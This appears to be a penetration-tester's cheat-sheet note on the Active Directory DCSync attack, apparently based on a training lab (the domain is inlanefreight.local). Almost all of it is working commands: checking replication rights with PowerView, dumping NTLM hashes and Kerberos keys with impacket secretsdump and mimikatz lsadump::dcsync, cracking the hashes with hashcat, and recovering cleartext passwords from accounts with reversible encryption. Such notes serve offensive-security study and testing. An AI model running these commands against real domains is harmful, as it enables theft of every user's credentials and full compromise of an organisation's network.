---
title: AD DCSync
draft: false
tags:
  - windows
  - active-directory
  - post-exploitation
  - privesc
---
 
DCSync is a technique for stealing the Active Directory password database by using the built-in `Directory Replication Service Remote Protocol`, which is used by Domain Controllers to replicate domain data. This allows an attacker to mimic a Domain Controller to retrieve any NTLM password hashes from the domain users.

> [!Requirements]
> - Access control over an account that has the rights to perform domain replication (a user with the `Replicating Directory Changes`, `Replicating Directory Changes All` and `Replicating Directory Changes in Filtered Set` permissions set).
> - By default, members of the _Domain Admins_, _Enterprise Admins_, and _Administrators_ groups have these rights assigned

**Manual Way**

1. Get DCSync user SID:
```powershell
PS C:\> Get-DomainUser -Identity USER  |select samaccountname,objectsid,memberof,useraccountcontrol |fl

C:\> whoami /user
```

2. Get ACLs associated with the object (domain) and check if the DCSync user has replication rights over it:
```powershell
PS C:\> $sid= "USER_SID"

PS C:\> Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} | select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl

Note: "DC=XXX, DC=XXX" is the domain object
Note: we have to see under ObjectAceType:
- DS-Replication-Get-Changes
- DS-Replication-Get-Changes-All
```

3. Extract NTLM Hashes and Kerberos Keys from Domain Users:

If we are from a non domain-joined linux host:
```shell
$ [impacket-secretsdump | secretsdump.py] -outputfile FILE -just-dc DOMAIN/USER:"PASSWORD"@DC_IP

Parameters:
-outputfile: output the hashes on files prefixed by FILE
-just-dc: extract NTLM hashes and Kerberos keys from the NTDS file
-just-dc-ntlm: extract only NTLM hashes
-just-dc-user <USERNAME>: extract data for a specific user
-pwd-last-set: check when each account password was last changed
-history: dump password history
-user-status: check and see if a user is disabled

List hashes files:
$ ls FILE*
FILE.ntds -> NTLM hashes
FILE.ntds.cleartext -> cleartext passwords (from **reversible encryption** user accounts)
FILE.ntds.kerberos -> Kerberos keys
```

> [!Note]
> We have to provide the credentials for a user with the required rights.

**Automatic Way**

If we are from a domain-joined Windows host and have a session with a user with DCSync privileges:
```powershell
PS C:\> .\mimikatz.exe

mimiatz # lsadump::dcsync /user:DOMAIN_HOSTNAME\USER

Parameters:
/user: domain username for which we want to obtain credentials (for example Administrator or corp\krbtgt)
```

Crack the hashes:
```bash
$ hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

4. Enumerate users with reversible encryption enabled:
```powershell
PS C:\> Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl

PS C:\> Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} | select samaccountname,useraccountcontrol
```

5. Obtain cleartext passwords for reversible encryption accounts:
```powershell
C:\Windows\system32>runas /netonly /user:INLANEFREIGHT\adunn powershell

PS C:\> .\mimikatz.exe (run mimikatz)

mimikatz # privilege::debug (check if we are a privileged user)

mimikatz # lsadump::dcsync /domain:DOMAIN_FQDN /user:DOMAIN_NAME\DOMAIN_USER (dump cleartext credentials for a specific account)
```

> [!Note]
> - Using mimikatz we can only target a specific user
> - Mimikatz must be ran in the context of the user who has DCSync privileges


